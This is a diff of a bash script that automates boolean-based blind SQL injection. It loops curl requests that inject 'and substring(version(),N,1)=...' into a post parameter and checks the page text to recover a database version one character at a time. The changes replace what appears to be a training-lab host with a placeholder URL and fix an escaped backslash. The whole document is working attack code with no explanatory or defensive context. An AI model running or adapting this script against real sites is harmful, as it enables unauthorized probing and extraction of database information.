@@ -2,7 +2,7 @@
 
 version=""
 count=0
-special_chars=('!' '-' '@' '#' '$' '%' '^' '&' '*' '(' ')' '_' '+' '=' '{' '}' '[' ']' '|' '\' ':' ';' '"' "'" '<' '>' ',' '.' '?' '/' '`' '~')
+special_chars=('!' '-' '@' '#' '$' '%' '^' '&' '*' '(' ')' '_' '+' '=' '{' '}' '[' ']' '|' '\\' ':' ';' '"' "'" '<' '>' ',' '.' '?' '/' '`' '~')
 
 for count in {1..10};do
 	special_char=true
@@ -12,7 +12,7 @@ for count in {1..10};do
 
 	for i in ${special_chars[@]};do
 		echo "Trying $i for Placeholder $count"
-		if curl -s https://gpjajyqyyfmmmh4w1n67b.ap-southeast-6.attackdefensecloudlabs.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
+		if curl -s https://url-to-test.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
 			echo "Placeholder $count is $i"
 			version=$version$i
 			special_char=false
@@ -25,7 +25,7 @@ for count in {1..10};do
 		echo "Not in special Letters trying with digits"
 		for i in {0..9};do
 			echo "Trying $i for Placeholder $count"
-			if curl -s https://gpjajyqyyfmmmh4w1n67b.ap-southeast-6.attackdefensecloudlabs.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
+			if curl -s https://url-to-test.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
 				echo "Placeholder $count is $i"
 				version=$version$i
 				digits=false
@@ -39,7 +39,7 @@ for count in {1..10};do
 		echo "Not in digits trying with lower case letters"
 		for i in {a..z};do
 			echo "Trying $i for Placeholder $count"
-			if curl -s https://gpjajyqyyfmmmh4w1n67b.ap-southeast-6.attackdefensecloudlabs.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
+			if curl -s https://url-to-test.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
 				echo "Placeholder $count is $i"
 				version=$version$i
 				lower=false
@@ -52,7 +52,7 @@ for count in {1..10};do
 		echo "Not in lower Letters and special letters and digits trying with capital case letters"
 		for i in {A..Z};do
 			echo "Trying $i for Placeholder $count"
-			if curl -s https://gpjajyqyyfmmmh4w1n67b.ap-southeast-6.attackdefensecloudlabs.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
+			if curl -s https://url-to-test.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
 				echo "Placeholder $count is $i"
 				version=$version$i
 				capital=false
